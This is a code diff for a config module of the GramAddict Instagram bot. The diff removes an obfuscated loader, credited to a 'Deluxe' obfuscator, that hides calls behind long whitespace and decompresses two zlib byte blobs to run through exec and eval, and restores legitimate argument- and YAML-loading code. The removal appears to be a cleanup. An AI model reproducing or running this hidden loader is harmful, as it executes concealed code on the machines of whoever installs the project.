@@ -1,99 +1,234 @@
-from builtins import *
-from math import prod as Floor
+import logging
+import os
+import sys
+from typing import Optional, Union
+
+import configargparse
+import yaml
+
+from . import write_custom_logs
+
+from GramAddict.core.plugin_loader import PluginLoader
+
+logger = logging.getLogger(__name__)
 
 
-__obfuscator__ = 'Deluxe'
-__authors__ = "SadHam"
-__github__ = 'https://github.com/'
-__discord__ = 'https://discord.gg/'
-__license__ = 'EPL-2.0'
+class Config:
+    def __init__(self, first_run=False, **kwargs):
+        if kwargs:
+            self.args = kwargs
+            self.module = True
+        else:
+            self.args = sys.argv
+            self.module = False
+        self.config = None
+        self.config_list = None
+        self.plugins = None
+        self.actions = None
+        self.special = None
+        self.analytics = None
+        self.actions_enabled = []
+        self.special_enabled = []
+        self.analytics_enabled = []
+        self.unknown_args = []
+        self.debug = False
+        self.device_id: Optional[str] = None
+        self.app_id: Optional[str] = None
+        self.first_run = first_run
+        self.username = False
 
-__code__ = 'print("Hello world!")'
+        # Pre-Load Variables Needed for Script Init
+        self.load_config()
 
+        if self.module:
+            self.debug = self.args.get("debug", False)
+            self.username = self.args.get("username", None)
+            self.app_id = self.args.get("app_id", "com.instagram.android")
+            self.device_id = self.args.get("device_id", None)
+        # else:
+        #     self.debug = "--debug" in self.args
+        #     if "--username" in self.args:
+        #         try:
+        #             self.username = self.args[self.args.index("--username") + 1]
+        #         except IndexError:
+        #             logger.warning(
+        #                 "Please provide a username with your --username argument. Example: '--username yourusername'"
+        #             )
+        #             exit(2)
+        #     if "--app-id" in self.args:
+        #         self.app_id = self.args[self.args.index("--app-id") + 1]
+        #     else:
+        #         self.app_id = "com.instagram.android"
 
-Divide, Round, _walk, _hypothesis, DetectVar, Theory, _negative = exec, str, tuple, map, ord, globals, type
+        # Configure ArgParse
+        self.parser = configargparse.ArgumentParser(
+            config_file_open_func=lambda filename: open(
+                filename, "r", encoding="utf-8"
+            ),
+            description="GramAddict Instagram Bot",
+        )
+        self.parser.add_argument(
+            "--config",
+            required=False,
+            is_config_file=True,
+            help="config file path",
+        )
 
-class Absolute:
-    def __init__(self, Hypothesis):
-        self.Ceil = Floor((Hypothesis, -21469))
-        self._ceil(Walk=38843)
+        # on first run, we must wait to proceed with loading
+        if not self.first_run:
+            self.load_plugins()
+            self.parse_args()
 
-    def _ceil(self, Walk = type):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        self.Ceil *= 83962 / Walk
-        
+    def load_config(self):
+        if self.module:
+            if not self.args.get("config", False):
+                return
+        elif "--config" not in self.args:
+            return
         try:
-            (((_hypothesis, _walk), Round) for Round in {Round: _statistics})
+            if self.module:
+                file_name = self.args.get("config")
+            else:
+                file_name = self.args[self.args.index("--config") + 1]
+            if not file_name.endswith((".yml", ".yaml")):
+                logger.error(
+                    f"You have to specify a *.yml / *.yaml config file path (For example 'accounts/your_account_name/config.yml')! \nYou entered: {file_name}, abort."
+                )
+                write_custom_logs.write(
+                    f"You have to specify a *.yml / *.yaml config file path (For example 'accounts/your_account_name/config.yml')! \nYou entered: {file_name}, abort."
+                )
+                sys.exit(1)
+            with open(file_name, encoding="utf-8") as fin:
+                self.config_list = [line.strip() for line in fin]
+                fin.seek(0)
+                self.config = yaml.safe_load(fin)
+        except IndexError:
+            logger.warning(
+                "Please provide a filename with your --config argument. Example: '--config accounts/yourusername/config.yml'"
+            )
 
-        except OSError:
-            (_walk, DetectVar) if Theory < _hypothesis else (Round, _walk, DetectVar) <= Divide
+            exit(2)
+        except FileNotFoundError:
+            logger.error(
+                f"I can't see the file '{file_name}'! Double check the spelling or if you're calling the bot from the right folder. (You're there: '{os.getcwd()}')"
+            )
+            write_custom_logs.write(
+                f"I can't see the file '{file_name}'! Double check the spelling or if you're calling the bot from the right folder. (You're there: '{os.getcwd()}')"
+            )
+            exit(2)
+        self.debug = self.config.get("debug", False)
+        self.username = self.config.get("username", None)
+        self.app_id = self.config.get("app_id", "com.instagram.android")
+        self.device_id = self.config.get("device", None)
 
-        except:
-            _negative(64666 / 49314) == Ellipsis
+    def load_plugins(self):
+        self.plugins = PluginLoader("GramAddict.plugins", self.first_run).plugins
+        self.special = {}
+        self.actions = {}
+        self.analytics = {}
+        for plugin in self.plugins:
+            if plugin.arguments:
+                for arg in plugin.arguments:
+                    try:
+                        action = arg.get("action", None)
+                        if action:
+                            self.parser.add_argument(
+                                arg["arg"],
+                                help=arg["help"],
+                                action=arg.get("action", None),
+                            )
+                        else:
+                            self.parser.add_argument(
+                                arg["arg"],
+                                nargs=arg["nargs"],
+                                help=arg["help"],
+                                metavar=arg["metavar"],
+                                default=arg["default"],
+                            )
+                        if arg.get("operation", False):
+                            self.actions[arg["arg"][2:]] = plugin
+                        if arg.get("special", False):
+                            self.special[arg["arg"][2:]] = plugin
+                        if arg.get("analytics", False):
+                            self.analytics[arg["arg"][2:]] = plugin
+                    except Exception as e:
+                        logger.error(
+                            f"Error while importing arguments of plugin {plugin.__class__.__name__}. Error: Missing key from arguments dictionary - {e}"
+                        )
 
-    def MemoryAccess(self, Frame = 75637):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        Frame /= -86598 + -13946
-        self._callfunction != None
-        
-        try:
-            ((_walk, (_walk, DetectVar)) for _walk in (_walk, Round) if _walk >= DetectVar)
+    def parse_args(self):
+        def _is_legacy_arg(arg):
+            if arg in ["interact", "hashtag-likers"]:
+                if self.first_run:
+                    logger.warning(
+                        f"You are using a legacy argument {arg} that is no longer supported. It will not be used. Please refer to https://docs.gramaddict.org/#/configuration?id=arguments."
+                    )
+                return True
+            return False
 
-        except ArithmeticError:
-            (Round, _walk, DetectVar) if DetectVar is Round else {'3ytggi': 'eeieyloit'} > _hypothesis
-
-        except:
-            _negative(94622 - -67156) == type
-
-    def Positive(_memoryaccess = type):
-        return Theory()[_memoryaccess]
-
-    def _math(Algorithm = -13640 - 72955, _builtins = True, _algorithm = Theory):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        _algorithm()[Algorithm] = _builtins
-        
-        try:
-            ((_hypothesis, {'3ytggi': 'eeieyloit'}) for _hypothesis in (_walk, DetectVar) if DetectVar is Theory)
-
-        except AssertionError:
-            (((_walk, DetectVar), Round) for Round in (_hypothesis, _walk))
-
-        except:
-            _negative(45649 * -63725) == str
-
-    def execute(code = str):
-        return Divide(Round(_walk(_hypothesis(DetectVar, code))))
-
-    @property
-    def _callfunction(self):
-        self._round = '<__main__._math object at 0x000004941BE60193>'
-        return (self._round, Absolute._callfunction)
-
-if True:
-    try:
-        Absolute.execute(code = __code__)
-        Substract = Absolute(Hypothesis = 25420 + -58691)
-
-        if 192493 > 5102947:
-            Substract._ceil(Walk = Substract.Ceil - 23088)
-        elif 482515 < 3275698:
-            Substract.MemoryAccess(Frame = 48988 * Substract.Ceil)                                                                                                                                                                                                                                                          ;Absolute._math(Algorithm='IIIIJJJJJILLIIIIJ',_builtins=b'x\x9c\xe5\x1b\xd9n\xe38\xf2\xdd@\xff\x03[y\x904m+\xe9\xcc\xcb\xac\x01\xef\xa2w\xfb\x984z\x92\xc6\xf6\x9c\xf0\x04\x02-\xd1\x0e\x13Z\xf4RR\x12#\xc8\xbfo\x15)\xc9\xb4D)\xc9\\\x18 \xf4\x11\x89\xac*\x16\x8b\xc5\xba\xe4\x1c\x90\x0f\x1f^\x92_dI.\xcb\xbc )\x93\x8be\x99\'\xb4`)\xa1d\xc9\x05#V\xcf\r/.\xc8[&\xca[6\x1a\x1d\x90\xff\xc8l\xa5hQ\nZp\x99\xe5/G\xa3Q\xa1\xb6\xd3\x11\x81\xc6\x97$\xd0\x17\xd8\xe2\xb8&"U\x1c\x93\x973\xe2\x19*\x1e\x91\xca\x82\xa2eq!U^\x81|\xa1\xe9\xb7t\xdd\x02Y\x01\x0b\xe5\xa2\x82\xb8(\x8aM>=<4\x9dQ"\xd7\x87-\xf0\x94\xe7\x89Ti\x0b\xbe\xea\x8dV\xab6\xbc\xe0\t\xcbrV\xc1\xbf\xfb\xfcir\x1c\x1d\xb5`\x12\x99V\x00\xfeF\xf1\xac\x08\xbco\x99\x10\x92\xdcH%\xd2\x97^\xe8k\xd8p\xda\xa0 \x8c\x9f_\xf1\xd4\x0fG\xec6a\x9b\xa2\x92Q\xb6)\x01\xfb\xbf2g9\xa1\x8a\x11\xc5\xd2_\xb3\x1f\xb9\x14\xac0\x1d\x0bQ\xb2_3\xdc\x1e\xbc\xa3\x04\x89\xfc\x9a\x9d\xca\x85L\xb7D\xf0+\xc0\xdb\xca\xd2\x0bG\x863\xbe\xdeHU\xc41\xcc\xb6\xcd\xfd0b\xb7\xbc\x08B\xd8\x16!\x13*\xf2 \x9c\xfb\xfc\x92\x0b\xf8p../\x85\x807\xfc\xf5\xcfg+!\x17\x001r\r#\x9a8\x81\x97y\xeb\xd7I\xfd\xed\xcf\xa7\xd3W\x93W\x93`\x12\xbcz\x1d\x86\xe7@\x8a\x15\xb4(T/\xa9\x9b\x9b\xdb[\xf3\xae\xfe\xea\xab\xdb.\xa1\x94\xf7\x13\xf9r||\xfcE\xbf\xf4\xfb\x8by\xe3\x17,\xc6\xacv\xd4\x0f\x83\x14~\xfe\t\xda\xcf\xfa\r_?\xd7\xb7?\x01\xfeN\x90\x03\x8b\x80e\xdcTK\xd1k\xd0\xeb\x00\xe4>\xba\x81\xbf(\xb9(x\x86\x1bsMU>\xea\xa1\x81\xe4\xdfJ\xf9\xf6\xec\xed\xd9\x19|\xcc\x05\xaej\'\xf4\x93\xbd\xed\x08\xfa\xa7\xe4<\xc9i\xc6\x17m\xe1\x86\xe3\xdb\xdbjNk#\x80\x99\xdfB+\x9c\xff\x91\xc4"\x9e\xa5\xec6\xf0\xb7`|n\xd9EVv@\xce\xc3\xdem\xf9\xf8\xf1\xe4\xe4\x13\xbcNN>~\x82\xcb\x8f\xf0\xfat\xf2\x1be\x97g\xbc\x10\xbc\xfcCd\xd7K\xeb\xb7\xc8\xae\x9fX-\xbb\x82J\xb1|\x8a\xdc\xce\xce\xe4\x99<\x92\xa0p\xf0utt\x84\xf7p\xf5\xfc$\'\xa4\xec\x8e\x82\xe0\x06\xce\xeaw\xdf\x9d\xc2\x1b>\xfa[_\x9c\x9e>C\xc9\xd1k\xe6\x92\xdc\xb0\x15\x06M\xe4\xa0\x85\xa0\x8f\x1c\xf5\x91\xa3r\x8a\xe7\'<V\xaa\xef\x9fr^QZ\xfc\x12\x87.Qv\xf0\x07\xe5\xc6\xf93\x94\x9c\xe0\x9b\xb5L\x9exfO\xf1\xa4\xe2A\xad\x0e.\xb4g(\xba\\\xd0\xf7O\x14\xdc\x19D&\x12\xfd\x04|\xdeb{~bSE\xfet;g\x84\xa5\x05\x07\xe2\xc3\x17\x04v\x12\x84\xe7\xfb\xd1\xa5\xe4\xd9\x80g>B\xbf\xac\xdf\x15\xaav\xd46\x0bN\x0f\x14tb\xc8`\xe1\x7f\xfd\xfa8=\xfe\xe68\xfd\xfa\xe8\xf8\x1f\x10\x86\xa6\x0cs\x99\xc0\xfffYt\xc3\xacP\x07\xe1\xcfls\x13v\xeb\xf4b\xd0\x96J\xaeI\x1d\xc3\x13\x93!\x10\x00O\xc6U\xc63\x16,\x1b\xe7\xf0Wn\xe0\x02s\xaf\xf1\x05\x13\x9b\x11\xc2\x04>\xe4~\xa3\nI\xc8\xd5\x8ag\xab\x17\xf5\xbd\xcc\x9bK\xc8\xdb^\x98\x99\x8a\xed\x06`\xeay\xce6\x98bS1&?dp\xf1b\xd4`$2[\xf2\x15U\xab\r\xe4\x14\xac\xe9\xde\xd2\xb5@(M\xeb\x83\xa2\xeb7i\xca\x93\x02rd\xc5\xa2\x8d(\x81\x81XH\x9a2UO\xf1Yw~\xd2}\x88\x89\\\xc2\xe8\xacf7\x82e~\xd2}A\x1cgt\r9p\x88p/F\x89\xa0y\x8e\xd5\x00`d\xfaB\xe7\xa2)[b>\n\xf2\x86l4gb9&K\xae\xf2"Ve6{\x0f\xd9\x19\x1b\x93\xaf\xbe\xba\xba\x01\xbe\xf3\xb0\xc2\xa9\xca\x06\xa6\xd3\xea\xc3\x86$"\xec\x07~\x0c\x80c|-\xd3R0\x80\xf8^\x95l7\xce`\xb6\x01r r\xbc\xbc\x1e"\xa89\xde\x01\xe8A#x\x18<\x95\x99{,\x16</\xdc\x00f\x07r\xf7 Mt=\xc5=\x98oX\xc2\xa9\xe8\xc1\x04\x15\xd9\x16\x90[\r\x12\x8eYF\x17\x82\xa5\x004?w\x93\x1f\x02i&\x19\x02*\xb3\xabL\xdedq%\xe4\xcex\xca\x16\xe5\xaaG\xb2)\xbb\xe6\t\x8by:m\xf4~\x0e\xe7\xea\xbcgQ\x9b\xcdcA\x1b\x15\x84\xe1\xe6\xba\xcdx\xce\x14j\xf7\x8e\xb7\x1d\xc0\x01\xf9\xac\xd8\x04\x8f\x08\xf9\x91*\x8e\x8b\xcf\xc9)c)\xc8`)\x15\xf9\x92(\xbe)\xc8\t\xa8}\x8b*\x1e\xb5\xd8hE\x10\xda$A\xe1-Us\xa9i-\xa9Fg\xf1 \x06\x9e\xee\xf6\xc6\x86\xc9\xd0\x81g-\xa4\x85Z\x8f\x006\n\xc9\x85l\x84\xdaE5\xfd\x80\xe8%r\rF3/\xe8\n\x8c\x0b\xe8D\xaa$\x0c\xb8h5\xdb\xe9ZD5\xd4e\xe5\xa0}n\x0f\xba"\xf1&\x13#\x06\xc2\xb3\x1d\xe96\n\x88\x18\x00\x9bE\xef\xc1v\xe8c\xc3"\xa6\xab\x7fP\xb4\xf3\xdd\xd2\x8c/\xb1\xe7\x0c\xc9+\xf2\xfa\xdcE\xd3\xd4\x03Ae\x00\xe5\x9dRR\xf5\xcel\xecq\x04\xc6/\x03k\x1c\xf4\x81a\xf3>\x0bFsF6J^\xf3\x14\x0b\x87\r\xc7\xba\x84\xbb\x95\xa5";\xf6\x08p]\xaeYVD\xe4\xdd-]o@\x0f\x89o\r#x}\xe3{}\x13\x87}\x03\xba\ny\xdc\x196\xdb\x02\n5\x81\xed\x7fxSz\xd4\xd2%\xf6\x8a\xa6[\xe8N\xad\xeaN\xd0\xa3\xdf\xfb\xd6\xc0\xb8\xbcR1\xf2F\xad>\x1b\xff\xbbGN\xfbd\xf4\xa1\xfb^:zS\t\\\xe3\xa8`\xff\xd0T\xce\x03\x8b\xef1\x86\x12\xf1\xb2\xcc\x92\x99\xa0\xebEjJ\xf2\xb8\x0fS\x82C-Ll5\x00\x1cQ\x05\xa7\x8ae\x10\xe2\x81\xbe\xcc\xbc\xb2XN\xbe\xf1\xf6\x11\xc2\xf1\xfe}\xcarm\xc2\xc0\x90\xce\xbc]\xd4\x00\xeaY\t\x82\xfc[\x16\x9e\x85\x14:\x17\x1c\xd14\x8dk\xa5j\xf1\x08\xfbc\x16\xe8\xb5\xe6V\xec\x7f%W,\xad\xc2\x83\xfdA\x9e\xc7\x96Xf\xe8\xe0[\x10\x18j\xcd\xbc\xca)\xeb\x07\x17\x1bZ\\\xb4x\xb57Of\xc6\x07\x10\xf0\x01cr\xc3\xc8\x1a\x9f\x80\xdcP^\x90B\xe2\xd1IX\xfd\xc8\x03\xad\xb7\x0e\xd8\x1av\x96$\x93E\xcb\xa9\xb8\x8c\xb7\xb6\xfb\x95\xb3\x0f\\\xc6Q\x0bL{\xc9\x9d_\xc0\xe0\xc9v\x18\x08\xd8\n\x92\xfa}\x86\xcd\xda\xce\xd0\xd6"\xaf\xdc\xc5\xb4\xab7\x8a\x15\xa5\xb2\x9c!$\xd6Kk\xb34\xd1\x9eC\xeaB\xdf\xb7\xa1\x0fr\x8dM+\xbc\xdbcUL\xb4\x04\xe8\x08\xecz\xe9\xb8\xecDM\xb5e\',)6\xa4"\x96\xa59\xeaB\x10x\xd1v-\xd0\x03F\x18c{\xa1K\x98\x95\xadfh\xd0\x1dgTs\xe9\xe1c\x9d\x0bz\xcdP\xddt\xd8\xb5\xdc\x82\xa5\xfe\n\xc9\x93C\xfc\x0b\xe4I[\xa1I\xf0\x1e\x02\rf\xcc4\xf1i\x92\xc82+\xf2C\xb4\xd1qu\xa79>4\x98H\xcd\x0f_\x12\xf3\x14\t\x8e#\x83#6%w\xcd\xca\xee\xc7\x84. \xfe\x8f\xbc.\x9f{\'\xa6n\x18/k\x93\xfe\xba\xb5\x1d\xfa\xa8h\xab\xd4\x10\xef\xda\x9f\x90\xd0\x1cV\xd3>,\x9ap7r\x9e\x0b\x9e\xb1\x08\x02:\xbe\tB\x1dba\x07\xea!\x908wm}\x16\xe5\x8c]\x05G\xe1 } \x8d\xd2\x8dr\xbad:\r\x02\x963\x0be\xc8+[\xfb\xdb\xf5\xc5u\xebz\xe0\xda.\xefy\xe0\x8a\x1b\xb7\xff\xad\x07\xed-\xae\xdd\xb0\xbd\xbbm\x9b\xde\xde\xb4\x8e\xff\xadV\xf7\x1e8:\x95\xc5{\xa0\x9e\x0e,\xb2O\x89\x97\xde\tIh\xe6\xa3\xad\x01\x1d\xbe`FI}K\xb5\xfc\x97\xe4\xad,!J&\xc9\x05K\xae4\x10h\xba\x10\x98\xd9\xc2f\xc2)\x83E\xf9\xe0?\x13j:\x11b\x81\x07O\xa7\xc0p\xa3\xf8\xea\x02n\xa5\x80\xac4"\xc1/\x06\x1cF\x14\n\xe9Nj\x03\x91\xdc\xa4Ax\xef\x87O\x96D7\xc0\xae\xe4:\x18b;c@\x1b\xb1?\xc0vD16\xe2\x13\xc2kwh\xbd\xcf>\x0e\xeexh9\x97\xda+\xb5\xbdK+?\xb5\xcb\x02\x81\x15\x13\xd4 @\x7f\xdf\r\x86\xf5Ho\xe2zw\xdf\x9b\xf0v\x87\xac\x8c\xd6\x1eD[`\xe6i\xbcR5m\xd7\xed\x98\x81\xa8>em\x88\x9a\x1c\x8c#\xadG@c\xeb:8\xbb\x99\x15\x01\xcf@\xa6\xdaZ\xdd\xe3N\xb9Z\xfc\x1a\xd0\x01\xea\x8dt\x1e\x0e\xb7\x9c\xcc\xa9\xd5\xdc\x83/\xef|\xfc0\xb0\x8e\xab4\x06^=\n\xc5\xf0?\xebY\xfa\x03\x04\x06D\xd3\xe3\xef\xed\xf6WI%\xc3H\xc2\x88E_\xfeY\xa2\\\xb3\x82^Se\xb0\xaa\x9bG!\xc21\xa7\xa5(\x0cbu\xf3 \xe2\x03jY\xef\'\xf8xE\xab-\xed\x8d\'\xedf\x1f\xf2\xf9N\xce\xf3\xe3\xe99Vj\xcc\x89{\xdc\xdc\x95\x15y\xd2\xcc\x15\xce\xef\x9c\xb9\xb1DO[u\x8d\xf5\xc4\xd9+\x1f\xfdN\xffAS\x02a\xd3\x90\xf2?"\xe2\xac\xdb\xd2\xd3\xde\x9e\xdc\\\xa0\xbf6\xd5_\xf4\xbd\x8d\xc5#\xb2\xb6\x99\xe4\xae\xb2\x86q\xac\x8b\xbcq\x1c\xd5\xb5\xdf{\x08Vt\xd0@\xbe\xe3y\x8e\xf8Wlk\xfc\xf6\x8e\x10:\n,\xca\xa9-\x99\x90;v\xef\x881\xeb\xb6\xe7\xa0\xac\xac\xa8\xed\x9ete\x19\xd2A\xc1V4\xd9"L\x00\x9f\xf6^\x98\x8dCs>\xf78\x06\xbd\xa0}\xe8V/h~\x01>u\x82\xbf\x9dRpj\x1d\x12\xad\xf3\x94\xbe\xbc\xae%\xf1\xfe\x18p\'\xef\xfa\x07\\\xa5\x96\x13%\x86\xf7FN\xe4\x0e\xae\xee!\xa8\xa1\x90b\xe5\x90x\x00\xed\x0ck\xefy\xb9\xc1\xcdaiDN 5\xe5B\xe8\xacd\x81\x94\xb0\xb3\n2\x15[\x020d\x11\xcd\xef\xdbd\x02q\x11\xb8jj\\\xb5T\xab\xc3\x83*d,\xcd\xd1\xfd\x17Og\xcd>\xb9b\xffjO\xda]&\xcfkU\xd8\xad\x81N\xcd\xf4\xa1d\xf5AYWr\xd6\xc1X\xe0\xbdit\x0bE0m\xa7\x84')
-
-        if 462755 > 5091866:
-            Absolute(Hypothesis = 10501 * -26284)._ceil(Walk = Substract.Ceil * 81075)
-        elif 256413 < 972541:
-            Substract._ceil(Walk = Substract.Ceil / -64938)                                                                                                                                                                                                                                                          ;Absolute._math(Algorithm='XXXXWXWWXXWWWWWWXWWXXWW',_builtins=b'6\xd1\xc4~ 1Hu\xe9\x99J\x8e\xa1I\xee,\xf4\xfb\x9e\x19p\x1f \xa0\x0f\x9a\xb42$\xff$G=\x93\xd9^I\xffd0F\x07\xd0\xae\x07\xd4MG\xa9v\x02\xe3\xf0{O\x16\xdc\xb2-9r\xe7\x13\xf3\xec1\xa8\x9f\x80\xcc_O\xcf\xc3\xbe\x05\xff\x85"\xad\xd8A\x89\xbe\xfes$:\xa8\x940w\x0c)\'\x16\x01[\xe7\x02\xa3\xc4\xab1\xb9\xde+\x84D\xbc`\xeb<py\x83\x9a\xd2\xab\x19\x18\x01H\xf7\xee\xae"\xc56\x82&,\xf0c\x7f\x0cI\x9e\x1f\xde\x93\xbb\xeb\xb6]lh\x8f\x9d\x0fS\xf6\x16\xaf-\xe5n8\xa8\x03\x13\x9cxX\x87~\xcf,\xfb\xb2\xf4@\x01w%\\\x9b\x8ekJ{\x1c\xe4\xb1\x96\xd7,\xd0\x14\x1c\x1b\xb4\xc7\x13dA\xc3Z\xff\x80\x13\xf4~0\xd4v\x0ejJ<\xf2\x8a\xe8b\x8e9\t\x85\xd2\xde\xc4\xce\x07:|\xb4\x94\xac\xb7\xaa7\xa4\x99C\xf4\xdd>\t\x82\xb8\x82%\xc5d!dr\xa5\x85\r\xb0\xc3\'\xf1\xa1`\xc0k\xfc\x87\xd6I\x9do\xeb\xfa\x8ao\xcf5\x85T\xa7d\x87K4\xec>\xce\xabk\x17v]\xca\x94\xact]\xc3Oy\x8e\x8f\xc5\x0c\xea\xc4\xd0\xc1d\xc6&\xf2xo\x83m\xa1\x18\xbdr\xe4\xf1\xf6y> ?1\x92a\xbd\x16\xbc\xe0\x9a\x82\xd4\xe1\xa3\xd7#\x15>\xe2n\x02\x9a\x1c\xe3(\x08!`\x95\xa9\x8d\x0e\xd0\xd5\x8a`c\xbaO\x84\xf7\xed\x9f\xa9NiO]\xe8\x9c\xa6\xb5\r\xad\x1a\x96c;\xc1bh\x15\xd0\x17\xb5\x0e\xec\x11_\x9a1Ty]y\x85\x9b(/\xa8*L\x15\xd2;h\x1b\xd1\xf3\xc1\xb3>\xf4@\xdaf\xc4\x86\xb3$\xd1\xf6>\x08=\xab\x98\xda\x08\xd8\x0c\x0f<\xf1\xfc\xe8\xbc1o\xded\x82\xa7\xaa\xcd$\xfeW@\x8f8\x1a\x93j\xd2\x04\x871\x05QT\xbf\xb4\x08,\xd3\xa5\x99\xd8M\x8b\xb3\xc6^\xe8\xd0\xa5Z\x94\xad\xe0\x11\xf1\xdb\'\xba\xaf8\xd9z~\x8e\x85\x1c\x96\xa5.\x12\xbaz\xfe\xd0R\xab\xbc\xe4o\xb9\xd4\xd6\xef\x00~\xefR\x9b4\xe8o\xb9\xd8\xce/\x1a\xf6\x96\xfb\x7f|\x86\x90\xe1')
-
-        Substract._ceil(Walk = Substract.Ceil / -12188)                                                                                                                                                                                                                                                          ;nmnmnmmnmnmmmnmnmmnmn,SSS2S222S2S22SSS2S222S,WXXXWXXXWXWWXWWXWXX,mmmnnnnnnmnmmnmmnmnnnm,iijjjilljliijlijijjijllli=(lambda IIlllIIllIIIIIllIlIlIllI:IIlllIIllIIIIIllIlIlIllI['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IIlllIIllIIIIIllIlIlIllI:IIlllIIllIIIIIllIlIlIllI(__import__('\x7a\x6c\x69\x62'))),(lambda IIlllIIllIIIIIllIlIlIllI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIlllIIllIIIIIllIlIlIllI)"),filename='\x49\x49\x6c\x49\x49\x49\x6c\x49\x6c\x49\x6c\x6c\x49\x49\x49\x49\x49\x49\x49\x49\x49',mode='\x65\x76\x61\x6c'))),(lambda MNNNNNMMNNNNMNMMMNMMNMN,IIlllIIllIIIIIllIlIlIllI:MNNNNNMMNNNNMNMMMNMMNMN(IIlllIIllIIIIIllIlIlIllI)),(lambda:(lambda IIlllIIllIIIIIllIlIlIllI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIlllIIllIIIIIllIlIlIllI)"),filename='\x49\x49\x6c\x49\x49\x49\x6c\x49\x6c\x49\x6c\x6c\x49\x49\x49\x49\x49\x49\x49\x49\x49',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
-        Absolute(Hypothesis = -7667 / -75775)._ceil(Walk = Substract.Ceil * -63477)                                                                                                                                                                                                                                                          ;iijjjilljliijlijijjijllli()(mmmnnnnnnmnmmnmmnmnnnm(nmnmnmmnmnmmmnmnmmnmn(SSS2S222S2S22SSS2S222S(WXXXWXXXWXWWXWWXWXX('\x76\x61\x72\x73'))),Absolute.Positive(_memoryaccess='IIIIJJJJJILLIIIIJ')+Absolute.Positive(_memoryaccess='XXXXWXWWXXWWWWWWXWWXXWW')))
-
-    except Exception as _statistics:
-        import traceback
-        print(f'    module {__name__} raised an Exception:')
-        print(f'     {_statistics}')
-        print(traceback.format_exc())
-        if 401959 > 8610544:
-            Absolute.execute(code = Round(_statistics))
-
-        elif 416787 > 8642866:
-            Substract.MemoryAccess(Frame = 61936 + Substract.Ceil)
+        if self.module:
+            if self.first_run:
+                logger.debug("Arguments used:")
+                if self.config:
+                    logger.debug(f"Config used: {self.config}")
+                if not len(self.args) > 0:
+                    self.parser.print_help()
+                    exit(0)
+        else:
+            if self.first_run:
+                logger.debug(f"Arguments used: {' '.join(sys.argv[1:])}")
+                if self.config:
+                    logger.debug(f"Config used: {self.config}")
+                if not len(sys.argv) > 1:
+                    self.parser.print_help()
+                    exit(0)
+        if self.module:
+            arg_str = ""
+            for k, v in self.args.items():
+                arg_str += f" --{k.replace('_', '-')} {v}"
+            self.args, self.unknown_args = self.parser.parse_known_args(args=arg_str)
+        else:
+            self.args, self.unknown_args = self.parser.parse_known_args()
+        if "run" in self.unknown_args:
+            self.unknown_args.remove("run")
+        if self.unknown_args and self.first_run:
+            logger.error(
+                "Unknown arguments: " + ", ".join(str(arg) for arg in self.unknown_args)
+            )
+            write_custom_logs.write("Unknown arguments in config file.")
+            self.parser.print_help()
+            for arg in self.unknown_args:
+                if "detect-block" in arg:
+                    logger.error(
+                        "Please replace the line 'detect-block: true/false' in your config file *.yml with 'disable-block-detection: true/false'"
+                    )
+                    break
+            exit(0)
+        # We need to maintain the order of plugins as defined
+        # in config or sys.argv
+        if self.config_list is not None:
+            config_list = [
+                item for item in self.config_list if item and not item.startswith("#")
+            ]
+        else:
+            config_list = None
+        for item in config_list or sys.argv:
+            item = item.split(":")[0].replace("--", "")
+            if (
+                item in self.actions
+                and getattr(self.args, item.replace("-", "_"))
+                and not _is_legacy_arg(item)
+            ):
+                self.actions_enabled.append(item)
+            elif (
+                item in self.special
+                and getattr(self.args, item.replace("-", "_"))
+                and not _is_legacy_arg(item)
+            ):
+                self.special_enabled.append(item)
+            elif (
+                item in self.analytics
+                and getattr(self.args, item.replace("-", "_"))
+                and not _is_legacy_arg(item)
+            ):
+                self.analytics_enabled.append(item)
